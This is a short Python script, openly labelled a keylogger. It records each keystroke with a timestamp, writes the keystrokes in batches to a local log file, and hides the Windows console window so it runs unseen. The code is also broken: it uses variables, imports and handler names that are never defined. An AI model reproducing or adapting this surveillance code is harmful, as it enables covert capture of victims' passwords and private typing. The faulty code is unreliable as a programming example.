from pynput import keyboard
key_data = ""


#keylogger function
def on_press(key):
    global log_data
    try:
        log_data += f"[{time.strftime('%H:%M:%S')}] Key: {key.char}\n"
        print(f'Key pressed: {key.char}')
    except AttributeError:
        log_data += f"[{time.strftime('%H:%M:%S')}] Special Key: {key}\n"
        print(f'Special key pressed: {key}')


    if len(log_data) > 500:
        with open("logfile.txt", "a") as f:
            f.write(log_data)
        log_data = ""

    if key == keyboard.Key.esc:
        print("Exiting listener...")
        return False  # Returning False stops the listener loop


def hide_console():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


def start_keylogger():
    hide_console()

    keyboard_listener = keyboard.Listener(on_press=on_key_press)
    mouse_listener = mouse.Listener(on_click=on_click)

    keyboard_listener.start()
    mouse_listener.start()

    keyboard_listener.join()
    mouse_listener.join()


start_keylogger()
